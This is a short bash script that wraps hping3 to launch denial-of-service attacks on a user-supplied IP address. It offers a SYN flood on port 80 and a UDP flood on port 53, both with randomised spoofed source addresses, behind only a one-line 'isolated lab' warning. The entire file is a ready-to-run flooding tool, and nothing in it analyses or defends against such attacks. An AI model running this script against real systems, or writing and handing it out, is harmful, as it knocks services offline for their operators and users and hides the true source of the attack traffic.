#!/usr/bin/env bash
set -euo pipefail

if ! command -v hping3 >/dev/null 2>&1; then
  echo "hping3 not installed. Install with: sudo apt install hping3"
  exit 1
fi

if [[ $# -lt 2 ]]; then
  echo "Usage: $0 <target_ip> <mode>"
  echo "Modes: syn | udp"
  exit 1
fi

TARGET_IP="$1"
MODE="$2"

echo "WARNING: Run only in your isolated lab network."
echo "Target: ${TARGET_IP}"

case "$MODE" in
  syn)
    sudo hping3 -S --flood --rand-source -p 80 "$TARGET_IP"
    ;;
  udp)
    sudo hping3 --udp --flood --rand-source -p 53 "$TARGET_IP"
    ;;
  *)
    echo "Unknown mode: $MODE"
    exit 1
    ;;
esac
